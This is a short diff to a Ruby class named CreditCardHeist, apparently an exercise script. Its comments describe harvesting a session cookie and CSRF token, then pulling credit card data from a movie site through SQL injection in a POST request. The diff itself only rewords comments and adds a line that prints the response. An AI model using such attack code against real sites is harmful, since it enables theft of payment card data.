@@ -54,8 +54,8 @@ class CreditCardHeist
 		end
 	end
 
-	# Extracts credit card information from the website via
-	# SQL injection in a POST request, and returns response
+	# Extracts credit card information from the website via SQL injection in a POST request
+	# Returns response
 	def extractCardInfo
 		secretInfo = getSecretInfo
 		cookieNumber = secretInfo[:cookie]
@@ -86,11 +86,12 @@ class CreditCardHeist
 		response = socket.read	#Read response
 		socket.close			#Close socket
 
+		puts response
 		return response
 	end
 
-	# Acquires session cookie and CSRF authenticity token by submitting
-	# a GET request, and returns these items in a hash
+	# Acquires session cookie and CSRF authenticity token by submitting a GET request
+	# Returns a hash containing these information
 	def getSecretInfo
 		http = Array.new
 		http << "GET /movies/selectGenre HTTP/1.1"
